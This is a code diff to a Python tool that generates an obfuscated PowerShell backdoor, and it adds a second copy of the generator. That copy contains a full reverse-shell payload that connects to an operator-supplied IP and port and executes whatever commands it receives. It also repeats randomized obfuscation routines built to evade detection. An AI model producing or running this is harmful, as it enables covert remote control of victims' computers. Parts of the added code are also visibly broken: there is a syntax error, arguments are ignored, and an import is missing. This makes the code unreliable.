@@ -15,8 +15,8 @@ cont = cont.replace("IPADDR", ip)
 cont = cont.replace("PORT", port)
 
 # REPLACE VARIABLES
-letters = [letter * 3 for letter in s.ascii_uppercase[0:13]]
-random = [''.join(r.choices(s.ascii_letters, k=r.randint(1, 17))) for _ in range(len(letters))]
+letters = [letter * 3 for letter in string.ascii_uppercase[0:13]]
+random = [''.join(random.choices(string.ascii_letters, k=random.randint(1, 17))) for _ in range(len(letters))]
 to = dict(zip(letters, random))
 
 pat = [re.escape(p) for p in letters]
@@ -37,8 +37,8 @@ def char_math(match):
     global cont
     parts = []
     for c in match.group(0)[1:-1]:
-        rnd = r.randint(1, 99)
-        operation = "+" if r.choice([True, False]) else "*"
+        rnd = random.randint(1, 99)
+        operation = "+" if random.choice([True, False]) else "*"
         compliment = "-" if operation == "+" else "/"
         if operation == "+":
             part = f"([char]({rnd}{operation}{str(ord(c))}{compliment}{rnd})" + r" |%{$_}| % {$_} |%{$_})"
@@ -53,12 +53,12 @@ def rand_string_index(match):
     char_positions = [''] * 200
     indices_used = []
     for char in matched_string:
-        index = r.choice([i for i in range(200) if char_positions[i] == ''])
+        index = random.choice([i for i in range(200) if char_positions[i] == ''])
         char_positions[index] = char
         indices_used.append(index)
     for i in range(len(char_positions)):
         if char_positions[i] == '':
-            char_positions[i] = r.choice(s.ascii_letters + s.digits)
+            char_positions[i] = random.choice(string.ascii_letters + string.digits)
     embedded_string = ''.join(char_positions)
     extraction_logic = "('" + embedded_string + "'[" + ','.join(map(str, indices_used)) + "] -join '')"
     return extraction_logic
@@ -69,8 +69,8 @@ def part_to_char(c):
 
 def part_math(c):
     parts = ''
-    rnd = r.randint(1, 99) 
-    operation = "+" if r.choice([True, False]) else "*"
+    rnd = random.randint(1, 99) 
+    operation = "+" if random.choice([True, False]) else "*"
     compliment = "-" if operation == "+" else "/"
     if operation == "+":
         return f"([char]({rnd}{operation}{str(ord(c))}{compliment}{rnd})" + r")"
@@ -80,12 +80,12 @@ def part_math(c):
 def rand_part_index(c):
     char_positions = [''] * 50
     indices_used = []
-    index = r.choice([i for i in range(50) if char_positions[i] == ''])
+    index = random.choice([i for i in range(50) if char_positions[i] == ''])
     char_positions[index] = c
     indices_used.append(index)
     for i in range(len(char_positions)):
         if char_positions[i] == '':
-            char_positions[i] = r.choice(s.ascii_letters + s.digits)
+            char_positions[i] = random.choice(string.ascii_letters + string.digits)
     embedded_string = ''.join(char_positions)
     return "('" + embedded_string + "'[" + ','.join(map(str, indices_used)) + "] -join '')"
      
@@ -106,7 +106,7 @@ env = [
 
 envMap = {}
 
-for c in s.printable:
+for c in string.printable:
     envMap[c] = {}
     for v in env:
         val = os.getenv(v)
@@ -122,12 +122,12 @@ def env_hide(match):
     for c in input_string:
         if c in envMap and envMap[c]:
             pVars = list(envMap[c].keys())
-            cVar = r.choice(pVars)
+            cVar = random.choice(pVars)
             pIndex = envMap[c][cVar]
-            cIndex = r.choice(pIndex)
+            cIndex = random.choice(pIndex)
             hidden_strings.append(f"$env:{cVar}[{cIndex}]")
         else:
-            rand = r.randint(1, 3)
+            rand = random.randint(1, 3)
             if rand == 1:
                 hidden_strings.append(part_to_char(c))
             elif rand == 2:
@@ -149,7 +149,7 @@ def replace(rand):
 
 # FOR EVERY INSTANCE OF // CHOOSE RANDOM OBF METHOD
 for i in range(0,48):
-    rand = r.randint(1, 4)
+    rand = random.randint(1, 4)
     replace(rand)
     
 def script_to_char(s):
@@ -159,3 +159,119 @@ def script_to_char(s):
 with open('backdoor.ps1', 'w') as c:
     c.write(script_to_char(cont))
 print("Check files for backdoor.ps1")
+
+import re
+import random
+import string
+
+# PAYLOAD AND PATTERN
+reverse_shell = """$ReverseShellConnection = (& (/New-Object/) (/System.Net.Sockets.TCPClient/)(((IP_ADDRESS), (PORT))));$NetworkStream = $ReverseShellConnection.(/GetStream/)();$ReadBuffer = (& (/New-Object/) Byte[] 65536);while (($BytesRead = $NetworkStream.(/Read/)($ReadBuffer, 0, $ReadBuffer.Length)) -ne 0) {;$CommandOutput = [System.Text.Encoding]::ASCII.GetString($ReadBuffer, 0, $BytesRead);$ExecutedOutput = (& (/Invoke-Expression/) $CommandOutput 2>&1) | & (/Out-String/);$PromptWithOutput = $ExecutedOutput + 'PS >';$OutputBytes = ([text.encoding]::ASCII.(/GetBytes/)($PromptWithOutput));$NetworkStream.(/Write/)($OutputBytes, 0, $OutputBytes.(/Length/));$NetworkStream.(/Flush/)();}$ReverseShellConnection.(/Close/)()"""
+
+pattern = r"/.+?/"
+
+# REPLACE IP/PORT
+ip_address = input("Enter IP: ")
+port = input("Enter port: ")
+reverse_shell = reverse_shell.replace("IP_ADDRESS", ip_address)
+reverse_shell = reverse_shell.replace("PORT", port)
+
+# REPLACE VARIABLES
+variables_2_replace = ["ReverseShellConnection",
+                       "NetworkStream",
+                       "ReadBuffer",
+                       "BytesRead",
+                       "CommandOutput",
+                       "ExecutedOutput",
+                       "PromptWithOutput",
+                       "OutputBytes"]
+
+for variable in variables_2_replace:
+    random_string = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
+    reverse_shell = reverse_shell.replace(variable, random_string)
+
+# METHOD 1
+def list_2_character_2_string(object):
+    command = match.group(0)[1:-1]
+    return r"([string]::join('', ( (" + str(ord(command)) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"
+
+# METHOD 2
+def character_2_string(object):
+    command = match.group(0)[1:-1]
+    return "+".join("[char]("+str(ord(c))+")" for c in command)
+
+# METHOD 3
+def random_string_2_string(object):
+    command = match.group(0)[1:-1]
+    char_positions = [''] * 150
+    indices_used = []
+    
+    for character in command:
+        index = random.choice([i for i in range(150) if char_positions[i] == ''])
+        char_positions[index] = character
+        indices_used.append(index)
+        
+    for i in range(len(char_positions)):
+        if char_positions[i] == '':
+            char_positions[i] = random.choice(string.ascii_letters + string.digits)
+            
+    return "'" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join ''"
+
+# METHOD 4
+env = [
+	"ALLUSERSPROFILE",
+	"CommonProgramFiles",
+	"ComSpec",
+	"ProgramData",
+	"ProgramFiles",
+	"ProgramW6432",
+	"PSModulePath",
+	"PUBLIC",
+	"SystemDrive",
+	"SystemRoot",
+	"windir"
+]
+
+envMap = {}
+
+for c in string.printable:
+    envMap[c] = {}
+    for v in env:
+        val = os.getenv(v)
+        if c in val:
+            envMap[c][v] = []
+            for i,t in enumerate(val):
+                if c == t:
+                    envMap[c][v].append(i)
+                    
+def env_hide(object):
+    if object
+    input_string = object.group(0)[1:-1]
+    hidden_strings = []
+    for c in input_string:
+        if c in envMap and envMap[c]:
+            pVars = list(envMap[c].keys())
+            cVar = random.choice(pVars)
+            pIndex = envMap[c][cVar]
+            cIndex = random.choice(pIndex)
+            hidden_strings.append(f"$env:{cVar}[{cIndex}]")
+        else:
+            rand = random.randint(1, 3)
+            if rand == 1:
+                hidden_strings.append(part_to_char(c))
+            elif rand == 2:
+                hidden_strings.append(part_math(c))
+            else:
+                hidden_strings.append(rand_part_index(c))
+    return "+".join(hidden_strings)
+
+# REPLACE EACH MATCH WITH RANDOM METHOD
+for match in range(int(reverse_shell.count("/")/2)):
+    reverse_shell = re.sub(pattern,
+                           lambda m: random.choice([list_2_character_2_string,
+                                                    character_2_string,
+                                                    random_string_2_string])(m),
+                           reverse_shell,
+                           count=1)
+
+# WRITE TO FILE
+print(reverse_shell)
